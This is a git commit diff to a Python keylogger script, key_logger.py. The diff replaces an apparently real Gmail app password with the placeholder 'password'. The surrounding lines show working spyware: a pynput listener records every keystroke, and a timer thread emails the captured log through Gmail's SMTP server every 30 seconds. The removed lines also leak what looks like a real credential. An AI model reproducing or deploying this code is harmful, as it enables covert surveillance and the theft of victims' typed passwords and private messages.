c0f3e1dd13b0a43d78b0bb823fd225f716de3d85
Vikas Rai <118038908+WildCarter26@users.noreply.github.com>
2024-06-03 18:09:55 +0530

    Update key_logger.py

--- Scripts/key_logger.py
+++ Scripts/key_logger.py
@@ -17,7 +17,7 @@ def callback_function(key):
     except:
         pass
     print (key)
-# pass ="sfbs fuwj kwjn xtqg"
+# pass ="password"
 def send_email(email,password,message):
     email_server=smtplib.SMTP("smtp.gmail.com",587)
     email_server.starttls()
@@ -29,7 +29,7 @@ keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 
 def thread_function():
     global log
-    send_email("email@gmail.com","sfbs fuwj kwjn xtqg",log.encode('utf-8'))
+    send_email("email@gmail.com","password",log.encode('utf-8'))
     log=""
     timer_object=threading.Timer(30,thread_function)
     timer_object.start()
